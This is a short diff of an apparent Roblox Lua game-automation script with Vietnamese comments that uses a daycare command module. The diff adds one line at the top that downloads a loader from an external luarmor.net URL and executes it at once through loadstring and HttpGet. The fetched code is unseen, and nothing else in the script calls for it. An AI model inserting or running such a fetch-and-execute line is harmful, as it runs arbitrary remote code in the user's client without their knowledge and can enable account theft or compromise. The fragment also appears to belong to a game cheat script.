@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/f420cbd8fa65c531f13fd0d569bc3300.lua"))()
 task.wait(25)
 -- Yêu cầu các module cần thiết từ ReplicatedStorage để sử dụng trong script.
 local DaycareCmds = require(game.ReplicatedStorage.Library.Client.DaycareCmds)
